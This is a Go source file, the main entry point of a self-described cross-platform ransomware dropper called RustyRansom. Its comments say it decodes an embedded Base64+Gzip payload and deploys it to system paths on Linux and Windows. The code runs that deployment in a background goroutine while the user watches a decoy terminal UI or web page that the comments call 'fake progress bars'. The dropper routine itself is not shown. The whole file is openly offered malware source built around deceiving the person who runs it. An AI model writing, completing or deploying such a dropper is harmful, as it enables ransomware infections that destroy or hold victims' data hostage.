// Package main implements a cross-platform ransomware dropper with TUI and web server interfaces.
//
// The dropper decodes, decompresses, and deploys the RustyRansom payload binary
// from embedded Base64+Gzip encoded data. It supports two execution modes:
//   - TUI Mode (default): Interactive terminal UI using charmbracelet/bubbletea
//   - Server Mode (-server flag): Web server displaying system information
//
// Platform Support:
//   - Linux: Deploys to /usr/share/rustyransom (no extension)
//   - Windows: Deploys to %PUBLIC%\rustyransom.exe
//
// Build Tags:
//   - linux_dropper.go: //go:build linux
//   - windows_dropper.go: //go:build windows
//
// The dropper function runs asynchronously in a goroutine and will fatal error
// if payload deployment fails.
package main

import (
	"flag"
	"fmt"
	"log"

	tea "github.com/charmbracelet/bubbletea"
)

// main is the dropper entry point - spawns payload deployment and launches UI.
//
// Execution flow:
//  1. Launch dropper() goroutine (async payload deployment)
//  2. Parse command-line flags (-server)
//  3. Launch either server mode or TUI mode
//
// The dropper() goroutine runs concurrently with the UI - payload is deployed
// while the user sees system information or fake progress bars.
//
// Flags:
//
//	-server: Enable web server mode instead of TUI
//
// Fatal Errors:
//   - dropper() failure (logged by goroutine)
//   - TUI initialization failure
func main() {

	// Deploy payload asynchronously - UI runs concurrently
	go func() {
		err := dropper()
		if err != nil {
			log.Fatalf("Fatal error in dropper function: %v", err)
		}
	}()

	var serverFlag = flag.Bool("server", false, "Display system information via a web server")
	flag.Parse()

	if *serverFlag {
		fmt.Println("Starting server mode...")
		runServer()
		return
	} else {
		p := tea.NewProgram(initialModel())
		if _, err := p.Run(); err != nil {
			log.Fatalf("TUI error: %v", err)
		}
	}
}
